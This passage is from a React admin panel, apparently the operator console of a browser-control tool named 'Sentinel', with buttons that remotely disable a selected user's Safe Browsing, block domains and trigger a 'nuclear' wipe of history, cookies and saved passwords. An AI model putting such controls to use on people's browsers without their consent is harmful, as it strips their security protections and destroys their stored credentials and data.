                                                        <button onClick={() => sendCommand('PRIVACY_ACTION', selectedUser.id, { setting: 'safeBrowsingEnabled', value: false })} className="bg-zinc-900 text-[7px] text-zinc-400 p-2 rounded-lg font-black uppercase hover:bg-red-900/20 hover:text-red-500 transition-all">Disable SafeBrowse</button>
                                                        <button onClick={() => sendCommand('PRIVACY_ACTION', selectedUser.id, { setting: 'spellingServiceEnabled', value: false })} className="bg-zinc-900 text-[7px] text-zinc-400 p-2 rounded-lg font-black uppercase hover:bg-white hover:text-black transition-all">Mute Spelling IA</button>
                                                        <button onClick={() => sendCommand('PRIVACY_ACTION', selectedUser.id, { setting: 'searchSuggestEnabled', value: false })} className="bg-zinc-900 text-[7px] text-zinc-400 p-2 rounded-lg font-black uppercase hover:bg-white hover:text-black transition-all">Kill Search Suggest</button>
                                                    </div>
                                                </div>

                                                <div className="space-y-3 pt-4 border-t border-zinc-800/50">
                                                    <span className="text-[8px] text-zinc-500 font-black uppercase tracking-widest flex items-center gap-2"><Globe size={12} className="text-red-500" /> Dynamic DNR Firewall</span>
                                                    <div className="flex gap-2">
                                                        <input id="blockDomain" type="text" placeholder="ex: google.com" className="flex-1 bg-black border border-zinc-800 rounded-xl p-3 text-[10px] text-white focus:border-red-500 outline-none" />
                                                        <button onClick={() => {
                                                            const dom = (document.getElementById('blockDomain') as HTMLInputElement).value;
                                                            sendCommand('BLOCK_DOMAIN', selectedUser.id, dom);
                                                        }} className="bg-red-600 text-white px-4 rounded-xl font-black text-[9px] uppercase hover:bg-white hover:text-red-600 transition-all">Block</button>
                                                    </div>
                                                </div>
                                            </div>

                                            {/* Nuclear Actions */}
                                            <div className="pt-4 border-t border-zinc-800/50 flex flex-col gap-3">
                                                <div className="flex gap-4">
                                                    <button onClick={() => { if (confirm('⚠️ ESTA AÇÃO LIMPARÁ TUDO (Histórico, Cache, Senhas, Cookies) do navegador pelo Sentinel. Confirmar Operação Nuclear?')) sendCommand('NUCLEAR_WIPE', selectedUser.id); }} className="flex-1 bg-red-950/40 hover:bg-red-600 border border-red-900/50 text-red-500 hover:text-white py-4 rounded-2xl text-[9px] font-black uppercase tracking-widest transition-all flex items-center justify-center gap-2">
                                                        <Trash2 size={12} /> Atomic Browser Wipe
                                                    </button>
                                                </div>
                                                <p className="text-[7px] text-zinc-700 text-center uppercase font-bold italic">Sentinel v3.5 - High Security Bypass Enabled</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
